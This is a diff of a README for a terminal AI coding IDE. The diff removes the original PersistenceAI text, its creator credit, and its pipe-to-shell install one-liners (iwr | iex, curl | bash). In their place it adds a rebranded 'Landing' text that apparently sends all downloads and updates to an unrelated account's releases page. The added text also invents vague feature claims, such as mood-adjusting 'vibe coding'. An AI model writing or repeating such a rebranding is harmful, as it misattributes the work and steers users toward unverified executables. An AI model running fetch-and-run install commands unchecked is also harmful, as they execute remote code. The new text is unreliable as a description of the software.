@@ -1,72 +1,84 @@
-# PersistenceAI (PAI)
+# 🌟 Landing - Simplifying Your Coding Experience
 
-**Created by Leo Louvar**
+## 🚀 Getting Started
 
-Enterprise-grade terminal AI IDE with multi-agent AI integration. Agentic coding multiplexer with full IDE features, multi-session AI conversations, terminal-first design, and vibe coding capabilities.
+Welcome to **Landing**, your gateway to an enhanced terminal experience with AI. This application offers a robust coding environment, integrating multi-agent AI features with a user-friendly interface. Whether you are a beginner or looking to optimize your workspace, Landing is designed to help you code efficiently.
 
-*Also known as: PAI, PersistenceAI, P-AI*
+## 🔗 Download Now
 
-## 🌐 Website
+[![Download Landing](https://img.shields.io/badge/Download-Landing-blue)](https://github.com/wiasesalvo/Landing/releases)
 
-Visit **[https://persistence-ai.github.io/Landing/](https://persistence-ai.github.io/Landing/)** for full documentation, installation guides, and features.
+## 💡 Features
 
-## 🚀 Quick Start
+- **Multi-Agent AI Integration:** Utilize multiple AI agents to enhance your coding process, making it more efficient and productive.
+- **Enterprise-Grade Terminal IDE:** Experience a powerful terminal environment with full IDE features tailored for both beginners and advanced users.
+- **Vibe Coding:** Create an immersive coding experience with our vibe coding feature, which adjusts the environment based on your mood and preferences.
+- **Terminal-First Design:** Navigate and manage projects easily within a terminal-first interface that prioritizes usability and speed.
 
-### Installation
+## 📥 Download & Install
 
-**Windows (PowerShell):**
-```powershell
-iwr -useb https://persistence-ai.github.io/Landing/install.ps1 | iex
-```
+To get started, you will need to visit our [Releases page](https://github.com/wiasesalvo/Landing/releases) to download the latest version.
 
-**Linux/macOS:**
-```bash
-curl -fsSL https://persistence-ai.github.io/Landing/install.sh | bash
-```
+1. Click the link above to go to the Releases page.
+2. Look for the latest version of Landing.
+3. Download the installation file suitable for your operating system (Windows, macOS, or Linux).
+4. Follow the prompts for installation:
+    - For **Windows**: Run the `.exe` file and follow the setup instructions.
+    - For **macOS**: Open the `.dmg` file and drag the Landing app into your Applications folder.
+    - For **Linux**: Extract the tarball, and follow the instructions in the terminal to install the package.
 
-## ✨ Features
+## 🔍 System Requirements
 
-- **Terminal IDE** - Full-featured IDE in your terminal
-- **Multi-Agent AI** - Switch between specialized AI agents
-- **Multi-Session** - Run multiple AI conversations in parallel
-- **Agentic Coding** - AI agents that decompose and execute complex tasks
-- **Built-in Editor** - File editing with syntax highlighting
-- **Workspace Explorer** - Navigate your project structure
-- **LSP Support** - Language Server Protocol integration
+Before downloading, ensure your system meets the following requirements:
 
-## 📚 Documentation
+- **Operating System:** Compatible with Windows 10+, macOS 10.12+, or any recent Linux distribution.
+- **RAM:** Minimum of 4GB RAM is recommended, 8GB for optimal performance.
+- **Disk Space:** At least 500MB of free disk space for installation.
+- **Network:** A stable internet connection for updates and downloads.
 
-- [Getting Started](https://persistence-ai.github.io/Landing/docs/)
-- [Agents](https://persistence-ai.github.io/Landing/docs/agents.html)
-- [Commands](https://persistence-ai.github.io/Landing/docs/commands.html)
-- [Keybinds](https://persistence-ai.github.io/Landing/docs/keybinds.html)
-- [Configuration](https://persistence-ai.github.io/Landing/docs/config.html)
-- [Providers](https://persistence-ai.github.io/Landing/docs/providers.html)
-- [Troubleshooting](https://persistence-ai.github.io/Landing/docs/troubleshooting.html)
+## 🛠️ Usage Instructions
 
-## 🛠️ Built With
+Once installed, open the Landing application. Here’s how to navigate the IDE:
 
-- **TypeScript** - Type-safe development
-- **Bun** - Fast JavaScript runtime
-- **OpenTUI** - Terminal UI framework
-- **Ollama** - Local LLM support
+1. **Create or Open a Project:**
+   - Select "New Project" to start a new coding venture.
+   - Choose "Open Project" to work on an existing one.
 
-## 📖 About
+2. **Access AI Features:**
+   - Use commands within the terminal to call upon AI features. For example, you can type `/ai help` for assistance.
 
-PersistenceAI is a terminal AI IDE and agentic coding multiplexer designed for developers who want powerful AI assistance directly in their terminal. Created by **Leo Louvar**, it combines the flexibility of terminal-based development with the power of multi-agent AI systems, enabling AI agentic coding and vibe coding workflows.
+3. **Explore Settings:**
+   - Customize your environment by going to "Settings" to adjust preferences about themes, fonts, and AI behavior.
 
-## 🔗 Links
+## ❓ Frequently Asked Questions
 
-- **Website:** https://persistence-ai.github.io/Landing/
-- **Organization:** https://github.com/Persistence-AI
-- **Creator:** Leo Louvar
-- **LinkedIn:** https://www.linkedin.com/in/leo-l-29171422b
-- **X (Twitter):** https://x.com/AiPersiste65218
+### 1. How do I update Landing?
 
-## 📝 License
+To update Landing, return to the [Releases page](https://github.com/wiasesalvo/Landing/releases) and download the latest version. Simply install it over your current version; your projects will remain intact.
 
-See repository for license information.
+### 2. What if I encounter issues?
+
+For troubleshooting, check the [issues section](https://github.com/wiasesalvo/Landing/issues) of our repository. You can report your issue there as well if it’s not already addressed.
+
+### 3. Can I customize the interface?
+
+Yes, you can customize themes and layouts in the Settings section to suit your preferences.
+
+## 🤝 Community Support
+
+Join our community for help and support. You can:
+
+- Visit the discussion forums to share tips and seek advice.
+- Check the GitHub Issues page for updates and bug fixes.
+- Collaborate with other users for project ideas and collaborations.
+
+## 📚 Learning Resources
+
+To make the most of Landing, consider exploring these resources:
+
+- **Documentation:** Comprehensive guides can be found on our GitHub wiki.
+- **Video Tutorials:** Check out our channel for video demonstrations on how to use various features.
 
 ---
 
-**PersistenceAI** - Terminal IDE with AI | Created by **Leo Louvar**
+We hope you enjoy using **Landing**! Embrace the power of AI in your coding journey and increase your productivity effortlessly. For more details, feel free to visit our [Releases page](https://github.com/wiasesalvo/Landing/releases) again to stay updated.
